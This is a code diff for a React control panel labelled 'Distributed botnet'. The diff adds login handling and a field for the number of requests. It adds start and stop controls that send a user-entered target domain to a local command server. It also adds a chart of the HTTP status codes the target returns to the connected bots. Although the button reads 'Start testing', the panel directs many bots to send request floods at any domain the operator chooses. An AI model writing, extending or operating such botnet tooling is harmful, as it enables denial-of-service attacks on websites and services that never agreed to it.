@@ -1,25 +1,63 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useReducer, useLayoutEffect } from "react";
+import { useNavigate } from "react-router-dom";
 import axios from "axios";
 import {
-  IconButton,
+  BarChart,
+  Bar,
+  XAxis,
+  YAxis,
+  CartesianGrid,
+  Tooltip,
+  Legend,
+  ResponsiveContainer,
+} from "recharts";
+import {
+  FormControl,
+  FormLabel,
+  Switch,
   Badge,
   Button,
   Input,
   Code,
-  Checkbox,
+  IconButton,
+  Icon,
 } from "@vechaiui/react";
 
 const Panel = () => {
+  const navigate = useNavigate();
+
   const serverUrl = "http://localhost:5000";
 
+  const exitIcon = (
+    <svg
+      width="24"
+      height="24"
+      xmlns="http://www.w3.org/2000/svg"
+      fill-rule="evenodd"
+      clip-rule="evenodd"
+    >
+      <path d="M11 21h8.033v-2l1-1v4h-9.033v2l-10-3v-18l10-3v2h9.033v5l-1-1v-3h-8.033v18zm-1 1.656v-21.312l-8 2.4v16.512l8 2.4zm11.086-10.656l-3.293-3.293.707-.707 4.5 4.5-4.5 4.5-.707-.707 3.293-3.293h-9.053v-1h9.053z" />
+    </svg>
+  );
+
   const [time, setTime] = useState(0);
+  const [requestsNum, setRequestsNum] = useState(100);
+  const [active, setActive] = useState(false);
   const [running, setRunning] = useState(false);
   const [target, setTarget] = useState("");
   const [activeBots, setActiveBots] = useState([]);
   const [botsStats, setBotsStats] = useState([]);
+  const [responses, setResponses] = useState<number[]>([]);
+  const [graphData, setGraphData] = useState<Object[]>([]);
+  const [visible, setVisible] = useState(false);
 
   let intervalTimer: NodeJS.Timer;
   let intervalActivity: NodeJS.Timer;
+
+  const logout = () => {
+    localStorage.removeItem("password");
+    navigate("/login");
+  };
 
   const changeServerStatus = async (serverUrl: string, status: boolean) => {
     const changeServerStatusEndpoint: string = "/setServerStatus";
@@ -30,9 +68,30 @@ const Panel = () => {
 
     try {
       await axios.post(serverUrl + changeServerStatusEndpoint, statusObject);
+      setActive(status);
     } catch (err) {
       console.log({
         message: "Status setting failed.",
+        errorInfo: err,
+      });
+    }
+  };
+
+  const setRequestsNumber = async (requestsNum: number) => {
+    const setRequestsNumberEndpoint: string = "/setRequestsNumber";
+
+    const requestsNumObject = {
+      requestsNumber: requestsNum,
+    };
+
+    try {
+      await axios.post(
+        serverUrl + setRequestsNumberEndpoint,
+        requestsNumObject
+      );
+    } catch (err) {
+      console.log({
+        message: "Requests number setting failed.",
         errorInfo: err,
       });
     }
@@ -69,7 +128,7 @@ const Panel = () => {
     }
   };
 
-  const getBotsStats = async (serverUrl: string) => {
+  const getBotsStats = async (serverUrl: string, responses: number[]) => {
     const getBotsStatsEndpoint = "/getBotsStats";
     try {
       const response = await axios.get(serverUrl + getBotsStatsEndpoint);
@@ -77,9 +136,56 @@ const Panel = () => {
 
       setBotsStats(responseData.stats);
       console.log(responseData.stats);
+      const statusCodes: number[] = [];
+      responseData.stats.forEach((resp: any) =>
+        statusCodes.push(...resp.Status)
+      );
+      setResponses(statusCodes);
+      setGraphData(parseStatsData(statusCodes));
     } catch (err) {
       console.log(err);
     }
+  };
+
+  const parseStatsData = (responseList: number[]) => {
+    const data: {
+      statusCode: string;
+      amount: number;
+    }[] = [];
+
+    const countCodes = responseList.reduce(
+      (acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc),
+      {}
+    );
+    for (const status of Object.keys(countCodes)) {
+      data.push({
+        statusCode: status,
+        amount: countCodes[status],
+      });
+    }
+
+    return data;
+  };
+
+  const startBotnet = (
+    serverUrl: string,
+    requestsNum: number,
+    target: string
+  ) => {
+    setRunning(true);
+    setTime(0);
+    setRequestsNumber(requestsNum);
+    setResponses([]);
+    changeServerStatus(serverUrl, true);
+    changeTarget(serverUrl, "https://" + target);
+    getActiveBots(serverUrl);
+  };
+
+  const stopBotnet = (serverUrl: string) => {
+    changeServerStatus(serverUrl, false);
+    setRunning(false);
+    setActiveBots([]);
+    setBotsStats([]);
   };
 
   useEffect(() => {
@@ -89,7 +195,7 @@ const Panel = () => {
       }, 10);
       intervalActivity = setInterval(() => {
         getActiveBots(serverUrl);
-        getBotsStats(serverUrl);
+        getBotsStats(serverUrl, responses);
       }, 10000);
     } else if (!running) {
       clearInterval(intervalTimer);
@@ -102,16 +208,35 @@ const Panel = () => {
     };
   }, [running]);
 
+  useEffect(() => {
+    if (!localStorage.getItem("password")) {
+      navigate("/login");
+    } else {
+      setVisible(true);
+    }
+  }, []);
+
+  if (!visible) return null;
+
   return (
     <div>
-      <div className="mt-8 mx-20">
-        <h1 className="text-3xl font-bold text-gray-700">Distributed botnet</h1>
-        <p className="text-gray-400 mb-8">version 1.0.0</p>
-        <div className=" w-full flex h-full">
+      <div className="mt-8 mx-20 mb-10 ">
+        <div className="flex justify-between">
+          <div className="w-full flex flex-col">
+            <h1 className="text-3xl font-bold text-gray-700">
+              Distributed botnet
+            </h1>
+            <p className="text-gray-400 mb-8">version 1.0.3</p>
+          </div>
+          <Button className="mt-2" onClick={logout}>
+            Exit
+          </Button>
+        </div>
+        <div style={{ height: "75vh" }} className="w-full flex">
           <div className="flex flex-col w-1/2">
-            <div className="h-1/2">
+            <div style={{ height: "40%" }} className="mb-5">
               <p className="text-gray-500 text-base mb-3">Give the target:</p>
-              <div className="w-5/6 mb-5">
+              <div className="w-5/6">
                 <Input.Group>
                   <Input.LeftAddon children="https://" />
                   <Input
@@ -122,27 +247,42 @@ const Panel = () => {
                   />
                 </Input.Group>
               </div>
-              <p className="text-gray-400 text-sm">Configuration:</p>
-              <div className="flex flex-col gap-1 mb-3">
-                <Checkbox defaultChecked>Setting string 1</Checkbox>
-                <Checkbox defaultChecked>Setting string 2</Checkbox>
-                <Checkbox defaultChecked>Setting string 3</Checkbox>
+              <div className="flex gap-5 mt-5 mb-3 w-5/6 ">
+                <FormControl id="email" className=" flex flex-col ">
+                  <FormLabel>Amount of requests</FormLabel>
+                  <Input
+                    placeholder="100"
+                    onChange={(e) => {
+                      setRequestsNum(parseInt(e.target.value));
+                    }}
+                    required
+                  />
+                </FormControl>
+                <FormControl className="flex flex-col">
+                  <FormLabel htmlFor="server-active" className="mb-0 mr-2">
+                    Set server active
+                  </FormLabel>
+                  <Switch
+                    className="mt-3"
+                    id="server-active"
+                    checked={active}
+                    onChange={() => changeServerStatus(serverUrl, !active)}
+                  />
+                </FormControl>
               </div>
-              <Button
-                onClick={() => {
-                  setRunning(true);
-                  setTime(0);
-                  changeServerStatus(serverUrl, true);
-                  changeTarget(serverUrl, "https://" + target);
-                  getActiveBots(serverUrl);
-                }}
-                variant="solid"
-                color="primary"
-              >
-                Start testing
-              </Button>
+              <div className="w-5/6 flex justify-end">
+                <Button
+                  onClick={() => {
+                    startBotnet(serverUrl, requestsNum, target);
+                  }}
+                  variant="solid"
+                  color="primary"
+                >
+                  Start testing
+                </Button>
+              </div>
             </div>
-            <div className="bg-gray-100 rounded h-1/2 overflow-scroll p-3">
+            <div className="bg-gray-100 rounded overflow-scroll p-3 flex flex-col h-1/2">
               <p className="text-gray-500 text-base mb-3">Bots response log:</p>
 
               {botsStats.length != 0
@@ -157,7 +297,7 @@ const Panel = () => {
             </div>
           </div>
           <div className="flex-col w-1/2">
-            <div className="h-72">
+            <div className="h-1/3">
               <div className="flex items-center mb-3 gap-2">
                 <p className="text-gray-500 text-base">Connected bots</p>
                 <Badge>{activeBots.length}</Badge>
@@ -178,10 +318,39 @@ const Panel = () => {
                 )}
               </div>
             </div>
-            <div className="bg-gray-100 rounded ml-2 h-60 p-3">
-              <p className="text-gray-400 text-sm ">
-                Placeholder for something
-              </p>
+            <div className="bg-gray-100 rounded ml-2 h-3/5 p-3">
+              <p className="text-gray-500 text-base mb-3">Requests stats</p>
+              {graphData.length == 0 ? (
+                <p className="mt-5">No information retrieved yet</p>
+              ) : (
+                <ResponsiveContainer>
+                  <BarChart
+                    data={graphData}
+                    margin={{
+                      top: 5,
+                      right: 30,
+                      left: 20,
+                      bottom: 25,
+                    }}
+                    barSize={30}
+                  >
+                    <XAxis
+                      dataKey="statusCode"
+                      scale="point"
+                      padding={{ left: 10, right: 10 }}
+                    />
+                    <YAxis />
+                    <Tooltip />
+                    {/* <Legend /> */}
+                    <CartesianGrid strokeDasharray="3 3" />
+                    <Bar
+                      dataKey="amount"
+                      fill="#14B8A6"
+                      background={{ fill: "#eee" }}
+                    />
+                  </BarChart>
+                </ResponsiveContainer>
+              )}
             </div>
           </div>
         </div>
@@ -195,11 +364,17 @@ const Panel = () => {
         </div>
         <div className=" flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Status:</p>
-          <p className="text-green-400 text-sm font-medium">Active</p>
+          {active ? (
+            <p className="text-green-400 text-sm font-medium">Active</p>
+          ) : (
+            <p className="text-red-400 text-sm font-medium">Disabled</p>
+          )}
         </div>
         <div className=" flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Requests sent:</p>
-          <p className="text-green-400 text-sm font-medium">16000</p>
+          <p className="text-gray-700 text-sm font-medium">
+            {responses.length}
+          </p>
         </div>
         <div className=" flex flex-row gap-1">
           <p className="text-gray-400 text-sm flex items-center">
@@ -215,10 +390,7 @@ const Panel = () => {
 
         <Button
           onClick={() => {
-            changeServerStatus(serverUrl, false);
-            setRunning(false);
-            setActiveBots([]);
-            setBotsStats([]);
+            stopBotnet(serverUrl);
           }}
           variant="solid"
           className="w-20"
